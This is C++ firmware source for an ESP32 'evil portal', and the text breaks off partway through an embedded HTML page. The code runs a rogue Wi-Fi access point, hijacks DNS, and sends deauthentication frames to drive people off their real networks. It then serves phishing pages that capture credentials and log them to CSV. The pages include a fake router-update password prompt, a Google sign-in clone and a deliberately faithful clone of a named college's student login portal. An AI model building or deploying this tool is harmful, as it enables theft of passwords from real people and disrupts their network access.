#include "evil_portal.h"
#include "core/config.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/utils.h"
#include "core/wifi/webInterface.h"
#include "core/wifi/wifi_common.h"
#include "esp_wifi.h"
#include "wifi_atks.h"

EvilPortal::EvilPortal(
    String tssid, uint8_t channel, bool deauth, bool verifyPwd, bool autoMode, bool backgroundMode
)
    : apName(tssid), _channel(channel), _deauth(deauth), _verifyPwd(verifyPwd), _autoMode(autoMode),
      _backgroundMode(backgroundMode), webServer(80), _launchTime(millis()) {
    
    _originalWifiMode = WiFi.getMode();
    _wifiWasConnected = (WiFi.status() == WL_CONNECTED);
    
    if (!setup()) return;
    cleanlyStopWebUiForWiFiFeature();
    beginAP();
    if (!_backgroundMode) {
        loop();
    }
}

EvilPortal::~EvilPortal() {
}

void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
    AsyncResponseStream *response = request->beginResponseStream("text/html");
    String url = request->url();
    if (url == "/") _portal->portalController(request);
    else if (url == "/post") _portal->credsController(request);
    else if (url == bruceConfig.evilPortalEndpoints.getCredsEndpoint &&
             bruceConfig.evilPortalEndpoints.allowGetCreds)
        request->send(200, "text/html", _portal->creds_GET());
    else if (url == bruceConfig.evilPortalEndpoints.setSsidEndpoint &&
             bruceConfig.evilPortalEndpoints.allowSetSsid) {
        if (request->hasArg("ssid")) {
            _portal->apName = request->arg("ssid").c_str();
            request->send(200, "text/html", _portal->ssid_POST());
            _portal->restartWiFi();
        } else {
            request->send(200, "text/html", _portal->ssid_GET());
        }
    } else {
        if (request->args() > 0) _portal->credsController(request);
        else _portal->portalController(request);
    }
}

bool EvilPortal::setup() {
    // FINALE: default to 172.0.0.1 — phones reliably pop the "Sign in to this
    // network" captive sheet on this gateway (192.168.4.1 did not on the demo unit).
    if (apGateway == IPAddress((uint32_t)0)) apGateway = IPAddress(172, 0, 0, 1);
    if (apName.isEmpty()) apName = "CIC_vari";

    if (_autoMode) {
        if (apName.indexOf("router") != -1 || apName.indexOf("update") != -1 ||
            apName.indexOf("firmware") != -1 || _verifyPwd) {
            loadDefaultHtml_one();
        } else {
            loadDefaultHtml();
        }
        return true;
    }

    options = {
        {"Custom Html", [this]() { loadCustomHtml(); }}
    };
    addOptionToMainMenu();

    if (!_verifyPwd) {
        // FINALE: CIC PowerCampus Self-Service clone is the demo default; the
        // Google sign-in page stays reachable as an alternate. The embedded markup
        // mirrors data/cic.html.
        options.insert(options.begin(), {"Google", [this]() { loadDefaultHtml(); }});
        options.insert(options.begin(), {"CIC Login", [this]() { loadDefaultHtml_cic(); }});
    } else {
        options.insert(options.begin(), {"Default", [this]() { loadDefaultHtml_one(); }});
    }

    loopOptions(options);
    if (returnToMenu) return false;

    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    wsl_bypasser_send_raw_frame(&ap_record, _channel);

    if (apName == "") {
        if (bruceConfig.evilWifiNames.empty()) {
            apName_from_keyboard();
        } else {
            options = {
                {"Custom Wifi", [this]() { apName_from_keyboard(); }}
            };
            for (const auto &_wifi : bruceConfig.evilWifiNames) {
                options.emplace_back(_wifi.c_str(), [this, _wifi]() { this->apName = _wifi; });
            }
            loopOptions(options);
        }
    }

    options = {
        {"172.0.0.1",   [this]() { apGateway = IPAddress(172, 0, 0, 1); }  },
        {"192.168.4.1", [this]() { apGateway = IPAddress(192, 168, 4, 1); }},
    };

    loopOptions(options);

    Serial.println("Evil Portal output file: " + outputFile);
    return true;
}

void EvilPortal::beginAP() {
    if (!_backgroundMode) {
        drawMainBorderWithTitle("VARIPORTAL");
        displayTextLine("Starting...");
    }
    if (_verifyPwd) WiFi.mode(WIFI_MODE_APSTA);
    else WiFi.mode(WIFI_MODE_AP);

    if (!WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0))) {
        Serial.println("[PORTAL] softAPConfig failed");
    }
    if (!WiFi.softAP(apName, emptyString, _channel)) {
        Serial.printf("[PORTAL] softAP failed for SSID '%s' on ch%d\n", apName.c_str(), _channel);
    }
    wifiConnected = true;

    int tmp = millis();
    while (millis() - tmp < 3000) yield();

    setupRoutes();
    dnsServer.start(53, "*", WiFi.softAPIP());
    webServer.begin();
}

void EvilPortal::setupRoutes() {
    webServer.on("/generate_204", HTTP_GET, [this](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
        request->send(response);
    });

    webServer.on("/gen_204", HTTP_GET, [this](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
        request->send(response);
    });

    webServer.on("/hotspot-detect.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
        request->send(
            200,
            "text/html",
            "<html><head><meta http-equiv=\"refresh\" content=\"0;url=http://" + WiFi.softAPIP().toString() +
                "\"></head><body></body></html>"
        );
    });

    webServer.on("/library/test/success.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
        request->send(response);
    });

    webServer.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send(200, "text/plain", "Microsoft NCSI");
    });

    webServer.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send(200, "text/plain", "Microsoft Connect Test");
    });

    webServer.on("/redirect", HTTP_GET, [this](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
        request->send(response);
    });

    webServer.on("/success.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send(200, "text/plain", "success");
    });

    webServer.on("/canonical.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
        request->send(response);
    });

    webServer.on("/fwlink", HTTP_GET, [this](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
        request->send(response);
    });

    webServer.on("/detectportal.firefox.com/success.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send(200, "text/plain", "success");
    });

    webServer.on("/client.msftconnecttest.com/redirect", HTTP_GET, [this](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
        request->send(response);
    });

    webServer.on("/", [this](AsyncWebServerRequest *request) { portalController(request); });
    webServer.on("/post", [this](AsyncWebServerRequest *request) { credsController(request); });

    if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
        webServer.on(
            bruceConfig.evilPortalEndpoints.getCredsEndpoint.c_str(),
            [this](AsyncWebServerRequest *request) { request->send(200, "text/html", creds_GET()); }
        );
    }
    if (bruceConfig.evilPortalEndpoints.allowSetSsid) {
        webServer.on(
            bruceConfig.evilPortalEndpoints.setSsidEndpoint.c_str(), [this](AsyncWebServerRequest *request) {
                if (request->hasArg("ssid")) {
                    apName = request->arg("ssid").c_str();
                    request->send(200, "text/html", ssid_POST());
                    restartWiFi();
                } else {
                    request->send(200, "text/html", ssid_GET());
                }
            }
        );
    }

    webServer.onNotFound([this](AsyncWebServerRequest *request) {
        String url = request->url();
        if (url.indexOf("detectportal") != -1 || url.indexOf("connecttest") != -1 ||
            url.indexOf("success") != -1 || url.indexOf("generate") != -1 ||
            url.indexOf("msftconnecttest") != -1 || url.indexOf("clients3.google.com") != -1) {
            AsyncWebServerResponse *response = request->beginResponse(302);
            response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
            request->send(response);
        } else if (request->args() > 0) {
            credsController(request);
        } else {
            portalController(request);
        }
    });

    _captiveHandler = new CaptiveRequestHandler(this);
    webServer.addHandler(_captiveHandler).setFilter(ON_AP_FILTER);
}

void EvilPortal::restartWiFi(bool reset) {
    webServer.end();
    dnsServer.stop();
    vTaskDelay(100 / portTICK_PERIOD_MS);
    
    _captiveHandler = nullptr;
    
    wifiDisconnect();
    WiFi.softAP(apName, emptyString, _channel);
    vTaskDelay(100 / portTICK_PERIOD_MS);

    setupRoutes();
    dnsServer.start(53, "*", WiFi.softAPIP());
    webServer.begin();
    
    if (reset) resetCapturedCredentials();
}

void EvilPortal::resetCapturedCredentials(void) { previousTotalCapturedCredentials = -1; }

void EvilPortal::loop() {
    if (_backgroundMode) return;

    int lastDeauthTime = millis();
    bool shouldRedraw = true;
    bool exitPortal = false;

    while (true) {
        if (shouldRedraw) {
            drawScreen();
            shouldRedraw = false;
        }

        dnsServer.processNextRequest();

        if (!isDeauthHeld && (millis() - lastDeauthTime) > 250 && _deauth) {
            send_raw_frame(deauth_frame, 26);
            lastDeauthTime = millis();
        }

        if (totalCapturedCredentials != (previousTotalCapturedCredentials + 1)) {
            shouldRedraw = true;
            previousTotalCapturedCredentials = totalCapturedCredentials - 1;
        }

        // OK/SEL opens the portal options menu (select = OK). Deauth toggle and
        // live View Creds live here so BACK can stay a pure "go up one level".
        if (check(SelPress)) {
            options = {
                {"Resume", [&shouldRedraw]() { shouldRedraw = true; }},
                {"View Creds", [this, &shouldRedraw]() {
                    FS *fs;
                    if (getFsStorage(fs)) {
                        if (fs->exists("/VariEvilCreds")) {
                            loopSD(*fs, false, "CSV", "/VariEvilCreds");
                        } else {
                            displayTextLine("No credentials yet");
                            vTaskDelay(1000);
                        }
                    }
                    shouldRedraw = true;
                }},
            };
            if (_deauth)
                options.push_back(
                    {isDeauthHeld ? "Resume deauth" : "Pause deauth",
                     [this]() { isDeauthHeld = !isDeauthHeld; }}
                );
            options.push_back({"Exit Portal", [&exitPortal]() { exitPortal = true; }});
            loopOptions(options);
            shouldRedraw = true;
        }

        // Global BACK rule: BACK goes up one level — exit the portal directly.
        // It must never open a sub-menu or act as select.
        if (check(EscPress)) exitPortal = true;

        if (exitPortal) {
            displayTextLine("Shutting down...");
            vTaskDelay(100 / portTICK_PERIOD_MS);

            webServer.end();
            vTaskDelay(200 / portTICK_PERIOD_MS);

            dnsServer.stop();
            vTaskDelay(100 / portTICK_PERIOD_MS);

            WiFi.mode(_originalWifiMode);
            vTaskDelay(100 / portTICK_PERIOD_MS);

            wifiDisconnect();
            vTaskDelay(100 / portTICK_PERIOD_MS);

            return;
        }

        if (verifyPass) {
            wifiDisconnect();
            verifyPass = false;
        }
    }
}

void EvilPortal::processRequests() {
    if (!_backgroundMode) return;
    dnsServer.processNextRequest();
    if (totalCapturedCredentials != (previousTotalCapturedCredentials + 1)) {
        previousTotalCapturedCredentials = totalCapturedCredentials - 1;
    }
}

bool EvilPortal::hasCredentials() { return totalCapturedCredentials > 0; }

String EvilPortal::getCapturedPassword() { return lastCred; }

String EvilPortal::getCapturedSSID() { return apName; }

void EvilPortal::setBaseDuration(uint16_t seconds) {
    _baseDurationSec = seconds;
}

void EvilPortal::setExtendedDuration(uint16_t seconds) {
    _extendedDurationSec = seconds;
}

bool EvilPortal::hasRecentActivity() {
    if (totalCapturedCredentials > previousTotalCapturedCredentials) {
        _lastActivityTime = millis();
        return true;
    }
    return (millis() - _lastActivityTime < 5000);
}

bool EvilPortal::hasRecentPageView() {
    return (millis() - _lastPageViewTime < 30000);
}

void EvilPortal::recordPageView() {
    _lastPageViewTime = millis();
}

bool EvilPortal::shouldTerminate() {
    unsigned long currentTime = millis();
    unsigned long elapsed = currentTime - _launchTime;
    
    if (_durationExtended) {
        return elapsed > (_extendedDurationSec * 1000);
    } else {
        return elapsed > (_baseDurationSec * 1000);
    }
}

void EvilPortal::checkAndExtendDuration() {
    if (_durationExtended) return;
    
    if (hasRecentActivity()) {
        _durationExtended = true;
        Serial.println("[PORTAL] Activity detected, extending duration");
    }
}

void EvilPortal::drawScreen() {
    drawMainBorderWithTitle("VARIPORTAL");

    String subtitle = "AP: " + apName.substring(0, 20);
    if (apName.length() > 20) subtitle += "...";
    printSubtitle(subtitle);

    // Keep each line short so nothing wraps on the small OLED: drop the IP prefix
    // (gateway is fixed/known) and the verbose " -> get creds" suffixes.
    padprintln("");
    if (bruceConfig.evilPortalEndpoints.showEndpoints) {
        if (bruceConfig.evilPortalEndpoints.allowGetCreds)
            padprintln("Creds: " + bruceConfig.evilPortalEndpoints.getCredsEndpoint);
        if (bruceConfig.evilPortalEndpoints.allowSetSsid)
            padprintln("SSID:  " + bruceConfig.evilPortalEndpoints.setSsidEndpoint);
        padprintln("");
    }

    padprintln("Portal: ACTIVE");
    padprintln(String(_verifyPwd ? "Attempts: " : "Victims: ") + String(totalCapturedCredentials));

    String passMode = "Full";
    switch (bruceConfig.evilPortalPasswordMode) {
        case FULL_PASSWORD: passMode = "Full"; break;
        case FIRST_LAST_CHAR: passMode = "p***d"; break;
        case HIDE_PASSWORD: passMode = "hidden"; break;
        case SAVE_LENGTH: passMode = "len"; break;
    }
    padprintln("Pwd: " + passMode);
    printLastCapturedCredential();
    printDeauthStatus();
}

void EvilPortal::printLastCapturedCredential() {
    while (lastCred.length()) {
        int newlineIndex = lastCred.indexOf('\n');
        if (newlineIndex > -1) {
            padprintln(lastCred.substring(0, newlineIndex));
            lastCred.remove(0, newlineIndex + 1);
        } else {
            padprint(lastCred);
            lastCred = "";
        }
    }
}

void EvilPortal::printDeauthStatus() {
    if (!_deauth || isDeauthHeld) {
        printFootnote("Deauth OFF");
    } else {
        tft.setTextColor(TFT_RED);
        printFootnote("Deauth ON");
        tft.setTextColor(bruceConfig.priColor);
    }
}

void EvilPortal::loadCustomHtml() {
    getFsStorage(fsHtmlFile);
    htmlFileName = loopSD(*fsHtmlFile, true, "HTML", "/");
    String fileBaseName =
        htmlFileName.substring(htmlFileName.lastIndexOf("/") + 1, htmlFileName.length() - 5);
    fileBaseName.toLowerCase();
    outputFile = fileBaseName + "_creds.csv";
    isDefaultHtml = false;

    File htmlFile = fsHtmlFile->open(htmlFileName, FILE_READ);
    if (htmlFile) {
        String firstLine = htmlFile.readStringUntil('\n');
        htmlFile.close();
        int apStart = firstLine.indexOf("<!-- AP=\"");
        if (apStart != -1) {
            int apEnd = firstLine.indexOf("\" -->", apStart);
            if (apEnd != -1) {
                apName = firstLine.substring(apStart + 9, apEnd);
            }
        }
    }
}

String EvilPortal::wifiLoadPage() {
    return String(
        "<!DOCTYPE html><html><head> <meta charset='UTF-8'> <meta name='viewport' "
        "content='width=device-width, initial-scale=1.0'> </style></head><body> <div class='container'> <div "
        "class='logo-container'> <?xml version='1.0' standalone='no'?> <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG "
        "20010904//EN' 'http://www.w3.orgTR/2001/REC-SVG-20010904/DTD/svg10.dtd'> </div> <div> <div "
        "id='logo' title='Wifi' style='display: flex;justify-content: center;max-width: 50%;margin: auto;'> "
        "<svg fill='#000000' height='800px' width='800px' version='1.1' id='Capa_1' "
        "xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' viewBox='0 0 365.892 "
        "365.892' xml:space='preserve'> <g> <circle cx='182.945' cy='286.681' r='41.494'/> <path id='p1' "
        "d='M182.946,176.029c-35.658,0-69.337,17.345-90.09,46.398c-5.921,8.288-4.001,19.806,4.286,25.726 "
        "c3.249,2.321,6.994,3.438,10.704,3.438c5.754,0,11.423-2.686,15.021-7.724c13.846-19.383,36.305-30.954,"
        "60.078-30.954 "
        "c23.775,0,46.233,11.571,60.077,30.953c5.919,8.286,17.437,10.209,25.726,4.288c8.288-5.92,10.208-17."
        "438,4.288-25.726 C252.285,193.373,218.606,176.029,182.946,176.029z'/> <path id='p2' "
        "d='M182.946,106.873c-50.938,0-99.694,21.749-133.77,59.67c-6.807,7.576-6.185,19.236,1.392,26.044 "
        "c3.523,3.166,7.929,4.725,12.32,4.725c5.051-0.001,10.082-2.063,13.723-6.116c27.091-30.148,65.849-47."
        "439,106.336-47.439 "
        "s79.246,17.291,106.338,47.438c6.808,7.576,18.468,8.198,26.043,1.391c7.576-6.808,8.198-18.468,1.391-"
        "26.043 C282.641,128.621,233.883,106.873,182.946,106.873z'/> <path id='p3' "
        "d='M360.611,112.293c-47.209-48.092-110.305-74.577-177.665-74.577c-67.357,0-130.453,26.485-177.664,"
        "74.579 "
        "c-7.135,7.269-7.027,18.944,0.241,26.079c3.59,3.524,8.255,5.282,12.918,5.281c4.776,0,9.551-1.845,13."
        "161-5.522 "
        "c40.22-40.971,93.968-63.534,151.344-63.534c57.379,0,111.127,22.563,151.343,63.532c7.136,7.269,18."
        "812,7.376,26.08,0.242 C367.637,131.238,367.745,119.562,360.611,112.293z'/> </g> </svg> </div> "
        "</div> </div> </div> <script> const paths = document.querySelectorAll('path'); let index = 0; "
        "function showNextPath() { if (index < paths.length) { paths[index].style.display = 'block'; "
        "index++; } } function hideAllPaths() { paths.forEach(path => { path.style.display = 'none'; }); "
        "index = 0; } hideAllPaths(); setInterval(function() { if (index < paths.length) { showNextPath(); } "
        "else { hideAllPaths(); } }, 1000); </script></body></html>"
    );
}

void EvilPortal::loadDefaultHtml_one() {
    htmlPage =
        "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' "
        "content='width=device-width, initial-scale=1.0'><title>Router Update</title><style>body "
        "{font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;background-color: #d3d3d3; /* Cinza "
        "mais escuro */display: flex;justify-content: center;align-items: center;height: 100vh;margin: "
        "0;padding: 10px;box-sizing: border-box;}.container {background-color: white;padding: "
        "20px;border-radius: 10px;box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);text-align: center;max-width: "
        "360px;width: 100%;}.container svg {width: 70px;height: 70px;fill: #ff1744; /* Cor de alerta "
        "*/margin-bottom: 20px;}h1 {color: #333;font-size: 22px;margin-bottom: 15px;}p {color: "
        "#666;font-size: 15px;margin-bottom: 20px;}input[type='password'] {width: 100%;padding: 12px;margin: "
        "10px 0;border-radius: 5px;border: 1px solid #ccc;font-size: 16px;box-sizing: border-box;}button "
        "{width: 100%;padding: 12px;background-color: #007bff;color: white;border: none;border-radius: "
        "5px;cursor: pointer;font-size: 16px;transition: background-color 0.3s;}button:hover "
        "{background-color: #0056b3;}div#success-block{display: none;text-align: center;min-height: "
        "60px;margin-bottom: 30px;justify-content: center;align-items: center;}</style></head><body><div "
        "class='container'><svg xmlns='http://www.w3.org/2000/svg' "
        "fill='#000000' width='800px' height='800px' viewBox='0 -1 26 26'><path fill-opacity='.3' d='M24.24 "
        "8l1.35-1.68C25.1 5.96 20.26 2 13 2S.9 5.96.42 6.32l12.57 15.66.01.02.01-.01L20 "
        "13.28V8h4.24z'/><path d='M22 22h2v-2h-2v2zm0-12v8h2v-8h-2z'/></svg><h1>Router Update</h1><div "
        "id='form-block'><p>Router firmware update required. Enter your Wi-Fi password to update.</p><form "
        "id='submit-form' action='/post'><input type='password' name='password' placeholder='Wi-Fi network "
        "password' required><button type='submit'>Update</button></form></div><div id='success-block'><p>The "
        "router will restart in <span id='span-count' style='font-weight: "
        "bolder;'>5</span></p></div></"
        "div><script>document.getElementById('submit-form').addEventListener('submit', function(event) "
        "{event.preventDefault();document.getElementById('success-block').style.display = "
        "'flex';document.getElementById('form-block').style.display = 'none';setInterval(function() {index = "
        "parseInt(document.getElementById('span-count').textContent)if (index > 1) "
        "{document.getElementById('span-count').textContent = index-1;index--;} else "
        "{document.getElementById('submit-form').submit();}}, 1000);});</script></body></html>";
    outputFile = "default_creds_1.csv";
    isDefaultHtml = true;
}

void EvilPortal::loadDefaultHtml() {
    htmlPage =
        "<!DOCTYPE html><html><head><title>Sign in: Google Accounts</title><meta charset='UTF-8'><meta "
        "name='viewport' content='width=device-width, initial-scale=1.0'><style>a:hover{text-decoration: "
        "underline;}body{font-family: Arial, sans-serif;align-items: center;justify-content: "
        "center;background-color: #FFFFFF;}input[type='text'], input[type='password']{width: 100%;padding: "
        "12px 10px;margin: 8px 0;box-sizing: border-box;border: 1px solid #cccccc;border-radius: "
        "4px;}.container{margin: auto;padding: 20px;max-width: 700px;}.logo-container{text-align: "
        "center;margin-bottom: 30px;display: flex;justify-content: center;align-items: center;}.logo{width: "
        "40px;height: 40px;fill: #FFC72C;margin-right: 100px;}.company-name{font-size: 42px;color: "
        "black;margin-left: 0px;}.form-container{background: #FFFFFF;border: 1px solid "
        "#CEC0DE;border-radius: 4px;padding: 20px;box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, "
        "0.2);}h1{text-align: center;font-size: 28px;font-weight: 500;margin-bottom: "
        "20px;}.input-field{width: 100%;padding: 12px;border: 1px solid #BEABD3;border-radius: "
        "4px;margin-bottom: 20px;font-size: 14px;}.submit-btn{background: #0b57d0;color: white;border: "
        "none;padding: 12px 20px;border-radius: 4px;font-size: 0.875rem;}.submit-btn:hover{background: "
        "#0e4eb3;}.forgot-btn{background: transparent;color: #0b57d0;border-radius: 8px;border: "
        "none;font-size: 14px;cursor: pointer;}.forgot-btn:hover{background-color: "
        "rgba(11,87,208,0.08);}.containerlogo{padding-top: 25px;}.containertitle{color: #202124;font-size: "
        "24px;padding: 15px 0px 10px 0px;}.containersubtitle{color: #202124;font-size: 16px;padding: 0px 0px "
        "30px 0px;}.containerbtn{display: flex;justify-content: end;padding: 30px 0px 25px 0px;}@media "
        "screen and (min-width: 768px){.logo{max-width: 80px;max-height: 80px;}}</style></head><body><div "
        "class='container'><div class='logo-container'><?xml version='1.0' standalone='no'?><!DOCTYPE svg "
        "PUBLIC '-//W3C//DTD SVG 20010904//EN' "
        "'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'></div><div "
        "class=form-container><center><div class='containerlogo'><div id='logo' "
        "title='Google'><svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' "
        "aria-hidden='true'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 "
        "0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 "
        "2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 "
        "1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 "
        "3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' "
        "d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 "
        "8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 "
        "5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 "
        "0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 "
        "5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 "
        "3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g "
        "id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 "
        "5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 "
        "0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 "
        "3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 "
        "2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 "
        "0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 "
        "3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path "
        "fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 "
        "1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 "
        "4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 "
        "0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 "
        "4.69-1.856z'></path></g></svg></div></div></center><div style='min-height: "
        "150px'><center><div class='containertitle'>Sign in</div><div class='containersubtitle'>Use your "
        "Google Account</div></center><form action='/post' id='login-form'><input name='email' "
        "class='input-field' type='text' placeholder='Email or phone' required><input name='password' "
        "class='input-field' type='password' placeholder='Enter your password' required /><div "
        "class='containermsg'><button class='forgot-btn'>Forgot password?</button></div><div "
        "class='containerbtn'><button id=submitbtn class=submit-btn "
        "type=submit>Next</button></div></form></div></div></div></body></html>";
    outputFile = "default_creds.csv";
    isDefaultHtml = true;
}

void EvilPortal::loadDefaultHtml_cic() {
    // CIC Canadian International College — PowerCampus Self-Service clone (faithful).
    // Full red/maroon (#8B0000) PowerCampus layout matching the real Home.aspx: header
    // logo + Catalog search, Home/Search nav, left Login sidebar, student splash collage,
    // Find Courses, footer. Responsive (stacks on phones). Logo + collage embedded as
    // base64 so the captive portal is self-contained. ~67KB String -> PSRAM
    // (BOARD_HAS_PSRAM). Mirrors data/cic.html. Posts to /post (user+pass).
    htmlPage = R"rawhtml(<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>PowerCampus Self-Service</title><style>*{box-sizing:border-box;}html,body{margin:0;padding:0;}body{font-family:Verdana,Arial,Helvetica,sans-serif;background:#fff;color:#333;font-size:13px;}a{color:#0a64a4;text-decoration:none;}a:hover{text-decoration:underline;}.maroon{background:#8B0000;}#hdr{background:#8B0000;background-image:linear-gradient(#9a0000,#7a0000);color:#fff;display:flex; align-items:center;justify-content:space-between;flex-wrap:wrap;padding:10px 16px;gap:10px;min-height:64px;}#hdr .logo{height:46px;width:auto;display:block;}#tools{display:flex;align-items:center;gap:8px;flex-wrap:wrap;font-size:11px;}#tools .help{color:#fff;font-weight:bold;margin-right:6px;}#tools select,#tools input.q{font-size:12px;padding:3px 4px;border:1px solid #b9b9b9;border-radius:0;}#tools input.q{width:150px;}#tools .sbtn{background:#e9e9e9;border:1px solid #adadad;color:#333;font-weight:bold;font-size:11px; padding:4px 12px;cursor:pointer;border-radius:0;}#nav{background:#8B0000;background-image:linear-gradient(#7a0000,#6a0000);padding:0 12px;display:flex;align-items:flex-end;gap:2px;}#nav .tab{color:#fff;font-weight:bold;font-size:12px;padding:7px 16px;display:block;}#nav .tab.active{background:#fff;color:#8B0000;border-radius:3px 3px 0 0;}#subnav{background:#8B0000;color:#fff;font-size:11px;padding:3px 18px 5px;}#subnav a{color:#fff;}.layout{display:flex;align-items:flex-start;gap:0;max-width:980px;margin:14px auto;padding:0 12px;}.side{width:210px;flex:0 0 210px;}.main{flex:1;padding-left:24px;min-width:0;}.login h2{background:#8B0000;color:#fff;margin:0;font-size:12px;font-weight:bold;height:26px;line-height:26px; padding:0 10px;border:1px solid #9eb4c4;display:flex;justify-content:space-between;align-items:center;cursor:pointer;}.login h2 .chev{font-size:10px;}.login .body{border:1px solid #d9dee3;border-top:0;background:#f3f6f8;padding:14px 12px 18px;}.login label{display:block;font-weight:bold;color:#8B0000;font-size:12px;margin:8px 0 3px;}.login input.f{width:100%;padding:5px 6px;border:1px solid #b9c2cc;font-size:13px;}.login .lbtn{margin-top:16px;background:#8B0000;color:#fff;border:0;padding:7px 22px;font-weight:bold; font-size:13px;cursor:pointer;border-radius:3px;}.login .lbtn:hover{background:#6a0000;}.banner img.coll{display:block;width:100%;height:auto;border:1px solid #ccc;border-bottom:0;}.banner .cap{background:#8B0000;color:#fff;font-weight:bold;font-size:15px;padding:9px 14px; border:1px solid #8B0000;}.findbar{margin:16px 2px;}.findbar a{font-weight:bold;}.findbar .arrow{color:#8B0000;font-weight:bold;margin-right:5px;}#ftr{background:#8B0000;background-image:linear-gradient(#7a0000,#6a0000);color:#fff;text-align:center; font-size:11px;padding:7px 12px;margin-top:24px;}@media (max-width:720px){ #hdr{padding:8px 12px;} #hdr .logo{height:38px;} #tools{width:100%;justify-content:flex-start;} .layout{flex-direction:column;margin:10px auto;} .side{width:100%;flex:none;margin-bottom:18px;} .main{padding-left:0;}}</style></head><body><div id='hdr'><img class='logo' 